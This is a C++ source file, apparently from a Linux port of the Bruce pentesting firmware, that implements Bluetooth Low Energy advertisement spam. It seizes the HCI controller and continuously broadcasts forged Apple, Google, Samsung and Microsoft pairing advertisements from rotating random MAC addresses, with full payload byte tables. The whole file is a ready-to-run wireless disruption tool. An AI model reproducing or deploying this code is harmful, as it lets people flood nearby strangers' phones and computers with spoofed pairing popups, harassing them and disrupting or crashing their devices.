/*
 * SPDX-FileCopyrightText: 2026 Bruce CardputerZero Community
 *
 * SPDX-License-Identifier: AGPL-3.0-only
 *
 * BLE advertisement spam. The ESP32 firmware uses NimBLE to broadcast rotating
 * Apple/Google/Samsung/Microsoft pairing advertisements; the Linux equivalent is
 * raw HCI LE advertising commands. We take exclusive control of the controller
 * via HCI_CHANNEL_USER (so BlueZ stops managing it), then loop: disable adv, set
 * a fresh random MAC, set the payload, enable adv, dwell, repeat. The payload
 * byte layouts are ported verbatim from the firmware's ble_spam module (which in
 * turn mirrors the Flipper Zero ble_spam reference).
 */

#include "ble_spam.h"

#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <ctime>

#if defined(__linux__)
#include <cerrno>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <time.h>
#include <unistd.h>
#include <csignal>

// Define the few Bluetooth constants/structs we need rather than depend on
// libbluetooth-dev (which the device may not ship). AF_BLUETOOTH is 31 on Linux.
#ifndef AF_BLUETOOTH
#define AF_BLUETOOTH 31
#endif
#define BLE_BTPROTO_HCI 1
#define BLE_HCI_CHANNEL_USER 1
#define BLE_HCI_COMMAND_PKT 0x01
#define BLE_HCIDEVUP _IOW('H', 201, int)
#define BLE_HCIDEVDOWN _IOW('H', 202, int)

struct ble_sockaddr_hci {
    unsigned short hci_family;
    unsigned short hci_dev;
    unsigned short hci_channel;
};
#endif // __linux__

namespace platform {
namespace {

// LE Controller (OGF 0x08) command opcodes, little-endian on the wire.
constexpr uint16_t kOcfReset          = 0x0C03; // OGF 0x03 (controller) reset
constexpr uint16_t kOcfSetAdvParams   = 0x2006;
constexpr uint16_t kOcfSetRandomAddr  = 0x2005;
constexpr uint16_t kOcfSetAdvData     = 0x2008;
constexpr uint16_t kOcfSetAdvEnable   = 0x200A;

// xorshift32 - fast, non-crypto PRNG for MACs and payload filler. Matches the
// firmware's choice of a cheap PRNG over hardware RNG for packet-rate spam.
// ponytail: non-crypto by design; do not use for anything security-sensitive.
uint32_t xorshift32(uint32_t& s) {
    s ^= s << 13;
    s ^= s >> 17;
    s ^= s << 5;
    return s;
}

uint8_t rnd8(uint32_t& s) { return static_cast<uint8_t>(xorshift32(s)); }

void fill_random(uint8_t* p, size_t n, uint32_t& s) {
    for (size_t i = 0; i < n; ++i) {
        p[i] = rnd8(s);
    }
}

// --- Device/payload tables, ported from firmware ble_spam.cpp ----------------

// Apple Continuity ProximityPair device IDs (big-endian in the packet).
constexpr uint16_t kAppleProximityDevices[] = {
    0x0E20, 0x1420, 0x2420, 0x2820, 0x2920, 0x2B20, 0x2C20, 0x0620, 0x0A20, 0x1020,
    0x0055, 0x0030, 0x0220, 0x0F20, 0x1320, 0x0320, 0x0B20, 0x0C20, 0x1120, 0x0520,
    0x0920, 0x1720, 0x1220, 0x1620, 0x2520, 0x2620, 0x2F20,
};

// Apple Continuity NearbyAction action codes.
constexpr uint8_t kContinuityActions[] = {
    0x13, 0x24, 0x05, 0x27, 0x20, 0x19, 0x1E, 0x09, 0x2F, 0x02, 0x0B, 0x01, 0x06, 0x0D, 0x2B,
};

// Google Fast Pair 3-byte model codes.
constexpr uint32_t kGoogleModels[] = {
    0x0001F0, 0x000047, 0x470000, 0x00000A, 0x0A0000, 0x00000B, 0x0B0000, 0x00000D, 0x000007,
    0x070000, 0x000009, 0x090000, 0x000048, 0x001000, 0x00B727, 0x01E5CE, 0x0200F0, 0x00F7D4,
    0xF00002, 0xF00400, 0x1E89A7, 0x0577B1, 0x05A9BC, 0xCD8256, 0x0000F0, 0xF00000, 0x821F66,
    0xF52494, 0x718FA4, 0x0002F0, 0x92BBBD, 0x000006, 0x060000, 0xD446A7, 0x2D7A23, 0x038B91,
};

// Samsung Galaxy Watch single-byte model selectors.
constexpr uint8_t kSamsungWatchModels[] = {
    0x1A, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0A, 0x0B,
    0x0C, 0x11, 0x12, 0x13, 0x14, 0x15, 0x16, 0x17, 0x18, 0x1B, 0x1C, 0x1D,
    0x1E, 0x20, 0x21, 0x22, 0x23, 0x24, 0x25, 0x26, 0x27, 0x28, 0x29, 0x2A,
};

// Samsung Galaxy Buds 3-byte color codes.
constexpr uint32_t kSamsungBudsModels[] = {
    0xEE7A0C, 0x9D1700, 0x39EA48, 0xA7C62C, 0x850116, 0x3D8F41, 0x3B6D02, 0xAE063C, 0xB8B905,
    0xEAAA17, 0xD30704, 0x9DB006, 0x101F1A, 0x859608, 0x8E4503, 0x2C6740, 0x3F6718, 0x42C519,
};

template <typename T, size_t N>
constexpr size_t count_of(const T (&)[N]) { return N; }

// AD "Flags" element (LE General Discoverable + BR/EDR not supported).
size_t put_flags(uint8_t* out) {
    out[0] = 0x02;
    out[1] = 0x01;
    out[2] = 0x06;
    return 3;
}

size_t build_apple_pair(uint8_t* out, uint32_t& s) {
    const uint16_t id = kAppleProximityDevices[xorshift32(s) % count_of(kAppleProximityDevices)];
    size_t i = 0;
    out[i++] = 0x1E; // AD length
    out[i++] = 0xFF; // manufacturer specific
    out[i++] = 0x4C; // Apple company id (0x004C, LE)
    out[i++] = 0x00;
    out[i++] = 0x07; // Continuity type: ProximityPair
    out[i++] = 0x19; // Continuity size
    out[i++] = 0x07; // prefix 0x07 = new-device popup
    out[i++] = static_cast<uint8_t>(id >> 8);
    out[i++] = static_cast<uint8_t>(id & 0xFF);
    out[i++] = 0x55;                 // status
    fill_random(&out[i], 3, s); i += 3; // battery
    out[i++] = 0x00;                 // color
    out[i++] = 0x00;                 // reserved
    fill_random(&out[i], 16, s); i += 16; // "encrypted payload"
    return i; // 31
}

size_t build_apple_action(uint8_t* out, uint32_t& s) {
    size_t i = put_flags(out);
    uint8_t action = kContinuityActions[xorshift32(s) % count_of(kContinuityActions)];
    uint8_t flags = 0xC0;
    if (action == 0x20 && (xorshift32(s) & 1)) flags--;
    if (action == 0x09 && (xorshift32(s) & 1)) flags = 0x40;
    out[i++] = 0x0A; // AD length (manuf element)
    out[i++] = 0xFF;
    out[i++] = 0x4C;
    out[i++] = 0x00;
    out[i++] = 0x0F; // Continuity type: NearbyAction
    out[i++] = 0x05; // size
    out[i++] = flags;
    out[i++] = action;
    fill_random(&out[i], 3, s); i += 3;
    return i; // 14
}

size_t build_google(uint8_t* out, uint32_t& s) {
    size_t i = put_flags(out);
    const uint32_t model = kGoogleModels[xorshift32(s) % count_of(kGoogleModels)];
    out[i++] = 0x03; out[i++] = 0x03; out[i++] = 0x2C; out[i++] = 0xFE; // 16-bit UUID list
    out[i++] = 0x06; out[i++] = 0x16; out[i++] = 0x2C; out[i++] = 0xFE; // service data 0xFE2C
    out[i++] = static_cast<uint8_t>((model >> 16) & 0xFF);
    out[i++] = static_cast<uint8_t>((model >> 8) & 0xFF);
    out[i++] = static_cast<uint8_t>(model & 0xFF);
    out[i++] = 0x02; out[i++] = 0x0A; // TX power AD
    out[i++] = static_cast<uint8_t>((xorshift32(s) % 120) - 100);
    return i; // 17
}

size_t build_samsung(uint8_t* out, uint32_t& s) {
    if (xorshift32(s) & 1) {
        // Galaxy Watch
        size_t i = put_flags(out);
        uint8_t model = kSamsungWatchModels[xorshift32(s) % count_of(kSamsungWatchModels)];
        const uint8_t watch[15] = {0x0E, 0xFF, 0x75, 0x00, 0x01, 0x00, 0x02, 0x00,
                                   0x01, 0x01, 0xFF, 0x00, 0x00, 0x43, model};
        std::memcpy(&out[i], watch, sizeof(watch));
        return i + sizeof(watch); // 18
    }
    // Galaxy Buds - fills the whole 31-byte legacy payload, no room for Flags.
    const uint32_t model = kSamsungBudsModels[xorshift32(s) % count_of(kSamsungBudsModels)];
    size_t i = 0;
    const uint8_t head[14] = {27, 0xFF, 0x75, 0x00, 0x42, 0x09, 0x81,
                              0x02, 0x14, 0x15, 0x03, 0x21, 0x01, 0x09};
    std::memcpy(&out[i], head, sizeof(head)); i += sizeof(head);
    out[i++] = static_cast<uint8_t>((model >> 16) & 0xFF);
    out[i++] = static_cast<uint8_t>((model >> 8) & 0xFF);
    out[i++] = 0x01;
    out[i++] = static_cast<uint8_t>(model & 0xFF);
    const uint8_t tail[13] = {0x06, 0x3C, 0x94, 0x8E, 0x00, 0x00, 0x00,
                              0x00, 0xC7, 0x00, 0x10, 0xFF, 0x75};
    std::memcpy(&out[i], tail, sizeof(tail)); i += sizeof(tail);
    return i; // 31
}

size_t build_microsoft(uint8_t* out, uint32_t& s) {
    size_t i = put_flags(out);
    uint8_t name_len = static_cast<uint8_t>(1 + (xorshift32(s) % 21)); // 1..21
    out[i++] = static_cast<uint8_t>(6 + name_len); // AD length
    out[i++] = 0xFF;
    out[i++] = 0x06; // Microsoft company id (0x0006, LE)
    out[i++] = 0x00;
    out[i++] = 0x03; // Swift Pair scenario
    out[i++] = 0x00;
    out[i++] = 0x80;
    const char* charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    for (uint8_t n = 0; n < name_len; ++n) {
        out[i++] = static_cast<uint8_t>(charset[xorshift32(s) % 62]);
    }
    return i; // 10 + name_len
}

#if defined(__linux__)
volatile sig_atomic_t g_stop = 0;
void on_signal(int) { g_stop = 1; }

// Write one HCI command (type byte + opcode LE + param len + params).
bool hci_cmd(int fd, uint16_t opcode, const uint8_t* params, uint8_t plen) {
    uint8_t buf[4 + 255];
    buf[0] = BLE_HCI_COMMAND_PKT;
    buf[1] = static_cast<uint8_t>(opcode & 0xFF);
    buf[2] = static_cast<uint8_t>(opcode >> 8);
    buf[3] = plen;
    if (plen) {
        std::memcpy(&buf[4], params, plen);
    }
    return write(fd, buf, 4u + plen) == static_cast<ssize_t>(4u + plen);
}

void drain(int fd) {
    uint8_t tmp[260];
    while (read(fd, tmp, sizeof(tmp)) > 0) { /* discard controller events */ }
}

void sleep_ms(long ms) {
    timespec ts{ms / 1000, (ms % 1000) * 1000000L};
    nanosleep(&ts, nullptr);
}
#endif // __linux__

} // namespace

bool ble_spam_parse_target(const char* name, BleSpamTarget& out) {
    if (!name) return false;
    if (std::strcmp(name, "apple") == 0)        { out = BleSpamTarget::Apple; return true; }
    if (std::strcmp(name, "apple-action") == 0) { out = BleSpamTarget::AppleAction; return true; }
    if (std::strcmp(name, "google") == 0)       { out = BleSpamTarget::Google; return true; }
    if (std::strcmp(name, "samsung") == 0)      { out = BleSpamTarget::Samsung; return true; }
    if (std::strcmp(name, "microsoft") == 0)    { out = BleSpamTarget::Microsoft; return true; }
    if (std::strcmp(name, "all") == 0)          { out = BleSpamTarget::All; return true; }
    return false;
}

std::size_t ble_spam_build_payload(BleSpamTarget target, uint8_t out[31], uint32_t& rng_state) {
    std::memset(out, 0, 31);
    if (target == BleSpamTarget::All) {
        static const BleSpamTarget pool[] = {BleSpamTarget::Apple, BleSpamTarget::AppleAction,
                                             BleSpamTarget::Google, BleSpamTarget::Samsung,
                                             BleSpamTarget::Microsoft};
        target = pool[xorshift32(rng_state) % count_of(pool)];
    }
    switch (target) {
        case BleSpamTarget::Apple:       return build_apple_pair(out, rng_state);
        case BleSpamTarget::AppleAction: return build_apple_action(out, rng_state);
        case BleSpamTarget::Google:      return build_google(out, rng_state);
        case BleSpamTarget::Samsung:     return build_samsung(out, rng_state);
        case BleSpamTarget::Microsoft:   return build_microsoft(out, rng_state);
        default:                         return build_apple_pair(out, rng_state);
    }
}

int ble_spam_main(int argc, char** argv) {
    BleSpamTarget target = BleSpamTarget::All;
    int dev = 0;
    if (argc >= 1 && argv[0] && !ble_spam_parse_target(argv[0], target)) {
        std::fprintf(stderr, "unknown target '%s' (apple|apple-action|google|samsung|microsoft|all)\n",
                     argv[0]);
        return 2;
    }
    if (argc >= 2 && argv[1]) {
        const char* p = argv[1];
        if (std::strncmp(p, "hci", 3) == 0) p += 3; // accept "hci0" or "0"
        dev = std::atoi(p);
    }

#if defined(__linux__)
    setvbuf(stdout, nullptr, _IOLBF, 0);
    std::signal(SIGTERM, on_signal);
    std::signal(SIGINT, on_signal);

    const int ctl = socket(AF_BLUETOOTH, SOCK_RAW | SOCK_CLOEXEC, BLE_BTPROTO_HCI);
    if (ctl < 0) {
        std::fprintf(stderr, "error: cannot open HCI socket (%s). Run as root.\n", std::strerror(errno));
        return 1;
    }
    // BlueZ must release the controller before we can grab the User channel.
    ioctl(ctl, BLE_HCIDEVDOWN, dev);

    const int fd = socket(AF_BLUETOOTH, SOCK_RAW | SOCK_CLOEXEC, BLE_BTPROTO_HCI);
    if (fd < 0) {
        std::fprintf(stderr, "error: cannot open HCI socket (%s)\n", std::strerror(errno));
        ioctl(ctl, BLE_HCIDEVUP, dev);
        close(ctl);
        return 1;
    }

    ble_sockaddr_hci addr{};
    addr.hci_family = AF_BLUETOOTH;
    addr.hci_dev = static_cast<unsigned short>(dev);
    addr.hci_channel = BLE_HCI_CHANNEL_USER;
    if (bind(fd, reinterpret_cast<sockaddr*>(&addr), sizeof(addr)) < 0) {
        std::fprintf(stderr,
                     "error: cannot take exclusive control of hci%d (%s).\n"
                     "hint: make sure the adapter exists and nothing else holds it;\n"
                     "      'rfkill unblock bluetooth' then retry.\n",
                     dev, std::strerror(errno));
        close(fd);
        ioctl(ctl, BLE_HCIDEVUP, dev);
        close(ctl);
        return 1;
    }

    hci_cmd(fd, kOcfReset, nullptr, 0);
    sleep_ms(100);
    drain(fd);

    // Advertising parameters: connectable undirected, random own address, all
    // channels, ~20-40ms interval. Set once; only MAC + data rotate per packet.
    const uint8_t params[15] = {
        0x20, 0x00, // min interval (0x0020 * 0.625ms = 20ms)
        0x40, 0x00, // max interval (40ms)
        0x00,       // ADV_IND (connectable undirected)
        0x01,       // own address type: random
        0x00,       // peer address type
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // peer address
        0x07,       // channel map: 37/38/39
        0x00,       // filter policy: allow all
    };
    hci_cmd(fd, kOcfSetAdvParams, params, sizeof(params));

    std::printf("BLE spam: hci%d, target=%s. Sending raw advertisements (Ctrl-C/back to stop).\n",
                dev, argv && argc >= 1 && argv[0] ? argv[0] : "all");

    uint32_t rng = static_cast<uint32_t>(time(nullptr)) ^ (static_cast<uint32_t>(getpid()) << 16);
    if (rng == 0) rng = 0x1234567u;

    unsigned long packets = 0;
    unsigned long last_count = 0;
    time_t last_report = time(nullptr);

    while (!g_stop) {
        const uint8_t disable = 0x00;
        hci_cmd(fd, kOcfSetAdvEnable, &disable, 1);

        uint8_t mac[6];
        fill_random(mac, 6, rng);
        mac[5] |= 0xC0; // static random address: top two bits of the MSB must be 11
        hci_cmd(fd, kOcfSetRandomAddr, mac, 6);

        uint8_t payload[31];
        const size_t len = ble_spam_build_payload(target, payload, rng);
        uint8_t data[32];
        data[0] = static_cast<uint8_t>(len);
        std::memcpy(&data[1], payload, 31);
        hci_cmd(fd, kOcfSetAdvData, data, sizeof(data));

        const uint8_t enable = 0x01;
        hci_cmd(fd, kOcfSetAdvEnable, &enable, 1);

        ++packets;
        sleep_ms(30); // dwell: a few adv events before rotating
        drain(fd);

        const time_t now = time(nullptr);
        if (now != last_report) {
            std::printf("  ~%lu packets sent (%lu pkt/s)\n", packets, packets - last_count);
            last_count = packets;
            last_report = now;
        }
    }

    const uint8_t disable = 0x00;
    hci_cmd(fd, kOcfSetAdvEnable, &disable, 1);
    close(fd);
    ioctl(ctl, BLE_HCIDEVUP, dev); // hand the controller back to BlueZ
    close(ctl);
    std::printf("BLE spam stopped.\n");
    return 0;
#else
    std::fprintf(stderr, "error: BLE spam is only available on Linux builds.\n");
    return 1;
#endif
}

} // namespace platform
